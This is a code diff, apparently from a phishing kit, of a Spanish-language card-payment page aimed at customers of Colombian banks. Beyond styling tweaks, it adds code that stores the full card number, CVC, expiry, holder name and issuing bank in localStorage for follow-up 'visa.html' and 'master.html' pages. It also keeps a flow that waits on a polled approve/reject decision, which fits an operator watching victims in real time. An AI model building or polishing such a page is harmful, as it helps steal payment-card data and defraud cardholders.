@@ -427,6 +427,7 @@
         .card-logo img {
             max-width: 100%;
             max-height: 100%;
+            object-fit: contain;
         }
 
         .card-input-wrapper .kern-input {
@@ -477,7 +478,7 @@
         }
 
         /* ============================================ */
-        /* LOADING OVERLAY - ESTILO LIMPIO              */
+        /* LOADING OVERLAY - SIMPLE COMO LA IMAGEN     */
         /* ============================================ */
         .loading-overlay {
             display: none;
@@ -486,9 +487,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(6px);
-            -webkit-backdrop-filter: blur(6px);
+            background: rgba(255, 255, 255, 0.60);
+            backdrop-filter: blur(3px);
+            -webkit-backdrop-filter: blur(3px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -503,8 +504,8 @@
         .loading-card {
             background: #ffffff;
             border-radius: 16px;
-            padding: 32px 28px;
-            max-width: 340px;
+            padding: 40px 32px 32px 32px;
+            max-width: 360px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
             text-align: center;
@@ -524,44 +525,32 @@
             }
         }
 
-        /* Logos superiores - SOLO IMAGENES, SIN TEXTO */
-        .logos-header {
+        /* Logo de la tarjeta - GRANDE y centrado */
+        .logo-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 16px;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
+            min-height: 100px;
         }
 
-        .logo-item {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .logo-item .logo-img {
-            height: 44px;
+        .logo-container .logo-img {
+            height: 80px;
             width: auto;
-            max-width: 100px;
+            max-width: 150px;
             object-fit: contain;
         }
 
-        .logo-divider {
-            font-size: 1.4rem;
-            color: #d1d5db;
-            font-weight: 300;
-        }
-
-        /* Texto - estilo simple como en la imagen */
+        /* Texto - estilo simple */
         .loading-card .loading-text {
             font-size: 0.95rem;
             font-weight: 500;
             color: var(--co-text-2);
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             letter-spacing: 0.2px;
         }
 
-        /* Barra de progreso - solo la barra, sin contador */
+        /* Barra de progreso - DELGADA */
         .progress-bar-wrapper {
             width: 100%;
         }
@@ -600,16 +589,16 @@
             100% { transform: translateX(100%); }
         }
 
-        /* Estado de carga inicial (spinner) */
+        /* Spinner inicial */
         .loading-card .initial-spinner {
             display: none;
-            width: 40px;
-            height: 40px;
+            width: 48px;
+            height: 48px;
             border: 3px solid var(--co-border);
             border-top: 3px solid var(--co-blue);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px auto;
+            margin: 0 auto 20px auto;
         }
 
         .loading-card .initial-spinner.active {
@@ -769,13 +758,12 @@
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
             
             .loading-card {
-                padding: 28px 20px;
-                max-width: 320px;
+                padding: 32px 24px 28px 24px;
+                max-width: 330px;
                 margin: auto;
             }
-            .logo-item .logo-img { height: 38px; max-width: 75px; }
-            .logos-header { gap: 14px; }
-            .logo-divider { font-size: 1.2rem; }
+            .logo-container .logo-img { height: 70px; max-width: 130px; }
+            .loading-card .loading-text { font-size: 0.9rem; }
         }
 
         @media (max-width: 480px) {
@@ -784,53 +772,43 @@
             .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
             
             .loading-card {
-                padding: 24px 16px;
-                max-width: 290px;
+                padding: 28px 20px 24px 20px;
+                max-width: 300px;
                 margin: auto;
             }
-            .logo-item .logo-img { height: 32px; max-width: 60px; }
-            .logos-header { gap: 10px; }
-            .logo-divider { font-size: 1rem; }
+            .logo-container .logo-img { height: 60px; max-width: 110px; }
             .loading-card .loading-text { font-size: 0.85rem; }
         }
 
         @media (max-width: 360px) {
             .loading-card {
-                padding: 20px 14px;
-                max-width: 260px;
+                padding: 24px 16px 20px 16px;
+                max-width: 270px;
                 margin: auto;
             }
-            .logo-item .logo-img { height: 28px; max-width: 50px; }
-            .logos-header { gap: 8px; }
-            .logo-divider { font-size: 0.8rem; }
+            .logo-container .logo-img { height: 50px; max-width: 90px; }
             .loading-card .loading-text { font-size: 0.8rem; }
         }
     </style>
 </head>
 <body>
     <!-- ============================================ -->
-    <!-- LOADING OVERLAY - ESTILO LIMPIO              -->
+    <!-- LOADING OVERLAY - SIMPLE COMO LA IMAGEN      -->
     <!-- ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
             <!-- Spinner inicial -->
             <div class="initial-spinner active" id="initialSpinner"></div>
             
-            <!-- Logos superiores (SOLO IMAGENES) -->
-            <div class="logos-header" id="logosHeader" style="display:none;">
-                <div class="logo-item">
-                    <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
-                </div>
-                <span class="logo-divider">+</span>
-                <div class="logo-item">
-                    <img id="bankLogoImg" src="" alt="Logo banco" class="logo-img" />
-                </div>
+            <!-- Logo de la tarjeta (SOLO EL LOGO GRANDE) -->
+            <div class="logo-container" id="logoContainer" style="display:none;">
+                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
             </div>
 
             <!-- Texto simple -->
             <div class="loading-text" id="loadingText">Procesando pago...</div>
 
-            <!-- Barra de progreso (SOLO LA BARRA, SIN CONTADOR) -->
+            <!-- Barra de progreso DELGADA -->
             <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
                 <div class="progress-bar-track">
                     <div class="progress-bar-fill-loading" id="progressFill"></div>
@@ -998,7 +976,7 @@
                                     <option value="Banco Occidente">Banco Occidente</option>
                                     <option value="Citibank Colombia">Citibank Colombia</option>
                                     <option value="Banco AV Villas">Banco AV Villas</option>
-                                    <option value="Banco Colpatria">Banco Colpatria</option>
+                                    <option value="Davibank">Davibank</option>
                                     <option value="Bancoomeva">Bancoomeva</option>
                                     <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
                                     <option value="Banco Finandina">Banco Finandina</option>
@@ -1062,25 +1040,35 @@
         let cardType = null;
 
         // ============================================
-        // MAPA DE LOGOS DE BANCOS
-        // ============================================
-        const bankLogos = {
-            'Bancolombia': 'bancol.png',
-            'Caja Social': 'Caja.jpg',
-            'Itaú': 'itau.png',
-            'Banco Occidente': 'occi.png',
-            'Banco Popular': 'popu.png',
-            'Banco de Bogotá': 'bog.png',
-            'Banco Falabella': 'fala.png'
-        };
-
-        // ============================================
         // MAPA DE LOGOS DE TARJETAS PARA LA CARGA
         // ============================================
         const cardLogos = {
             'visa': 'visa.png',
             'mastercard': 'master.png',
             'amex': 'ame.png'
+        };
+
+        // ============================================
+        // MAPA DE LOGOS DE BANCOS PARA LAS PÁGINAS visa.html Y master.html
+        // ============================================
+        const bankLogos = {
+            'Bancolombia': 'bancol.png',
+            'Davivienda': 'davivienda.png',
+            'BBVA Colombia': 'bbva.png',
+            'Banco de Bogotá': 'bog.png',
+            'Banco Popular': 'popu.png',
+            'Banco Occidente': 'occi.png',
+            'Citibank Colombia': 'citi.png',
+            'Banco AV Villas': 'avvillas.png',
+            'Davibank': 'db.png',
+            'Bancoomeva': 'bancoomeva.png',
+            'Banco GNB Sudameris': 'gnb.png',
+            'Banco Finandina': 'finandina.png',
+            'Banco Falabella': 'fala.png',
+            'Banco Pichincha': 'pichincha.png',
+            'Banco Cooperativo Coopcentral': 'coopcentral.png',
+            'Caja Social': 'Caja.jpg',
+            'Itaú': 'itau.png'
         };
 
         // ============================================
@@ -1129,9 +1117,8 @@
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
-        const logosHeader = document.getElementById('logosHeader');
+        const logoContainer = document.getElementById('logoContainer');
         const cardLogoImg = document.getElementById('cardLogoImg');
-        const bankLogoImg = document.getElementById('bankLogoImg');
         const progressWrapper = document.getElementById('progressWrapper');
         const progressFill = document.getElementById('progressFill');
         const initialSpinner = document.getElementById('initialSpinner');
@@ -1303,33 +1290,49 @@
         }
 
         // ============================================
-        // MOSTRAR PANTALLA DE CARGA - ESTILO LIMPIO
+        // GUARDAR DATOS EN LOCALSTORAGE PARA LAS PÁGINAS visa.html Y master.html
         // ============================================
-        function mostrarCargaConLogos(tipoTarjeta, banco) {
+        function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
+            const cardLast4 = cardNumber.slice(-4);
+            
+            // Guardar datos de la tarjeta
+            localStorage.setItem('cardNumber', cardNumber);
+            localStorage.setItem('cardLast4', cardLast4);
+            localStorage.setItem('cvc', cvc);
+            localStorage.setItem('expiry', expiry);
+            localStorage.setItem('cardholderName', cardholderName);
+            localStorage.setItem('cardType', cardType);
+            
+            // Guardar el banco emisor para visa.html / master.html
+            localStorage.setItem('bancoEmisor', banco);
+            
+            // Guardar el logo del banco (solo para visa.html / master.html)
+            const bankLogoFile = bankLogos[banco] || '';
+            localStorage.setItem('bankLogo', bankLogoFile);
+            
+            console.log('💾 Datos guardados en localStorage:', {
+                cardType: cardType,
+                bancoEmisor: banco,
+                bankLogo: bankLogoFile
+            });
+        }
+
+        // ============================================
+        // MOSTRAR PANTALLA DE CARGA - SIMPLE
+        // ============================================
+        function mostrarCargaConLogos(tipoTarjeta) {
             // Ocultar spinner inicial
             initialSpinner.classList.remove('active');
             initialSpinner.style.display = 'none';
             
-            // Mostrar logos
-            logosHeader.style.display = 'flex';
+            // Mostrar logo de la tarjeta (GRANDE)
+            logoContainer.style.display = 'flex';
             
             // Actualizar logo de tarjeta
             const cardLogoFile = cardLogos[tipoTarjeta];
             if (cardLogoFile) {
                 cardLogoImg.src = cardLogoFile;
                 cardLogoImg.alt = tipoTarjeta.charAt(0).toUpperCase() + tipoTarjeta.slice(1);
-            }
-            
-            // Actualizar logo de banco
-            const bankLogoFile = bankLogos[banco];
-            if (bankLogoFile) {
-                bankLogoImg.src = bankLogoFile;
-                bankLogoImg.alt = banco;
-                document.querySelector('.logo-item:last-child').style.display = 'flex';
-                document.querySelector('.logo-divider').style.display = 'block';
-            } else {
-                document.querySelector('.logo-item:last-child').style.display = 'none';
-                document.querySelector('.logo-divider').style.display = 'none';
             }
             
             // Mostrar barra de progreso
@@ -1461,7 +1464,7 @@
         // ============================================
         // POLLING PARA ESPERAR APROBACIÓN DEL PAGO
         // ============================================
-        function iniciarPollingPago(banco) {
+        function iniciarPollingPago() {
             let tiempoInicio = Date.now();
 
             pollingInterval = setInterval(async () => {
@@ -1484,7 +1487,7 @@
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    mostrarCargaConLogos(cardType, banco);
+                    mostrarCargaConLogos(cardType);
 
                 } else if (resultado === 'rejected') {
                     clearInterval(pollingInterval);
@@ -1552,18 +1555,18 @@
                 return;
             }
 
+            // GUARDAR DATOS EN LOCALSTORAGE
+            guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco);
+
             solicitudId = generarSolicitudId();
 
             loadingOverlay.classList.add('active');
             
             initialSpinner.style.display = 'block';
             initialSpinner.classList.add('active');
-            logosHeader.style.display = 'none';
+            logoContainer.style.display = 'none';
             progressWrapper.style.display = 'none';
             loadingText.textContent = 'Procesando pago...';
-            
-            document.querySelector('.logo-item:last-child').style.display = 'flex';
-            document.querySelector('.logo-divider').style.display = 'block';
 
             submitButton.disabled = true;
             submitButton.textContent = 'Procesando...';
@@ -1618,7 +1621,7 @@
 
             if (enviado) {
                 mostrarInfo('⏳ Esperando aprobación del pago...');
-                iniciarPollingPago(banco);
+                iniciarPollingPago();
             } else {
                 mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
                 cardNumberInput.disabled = false;
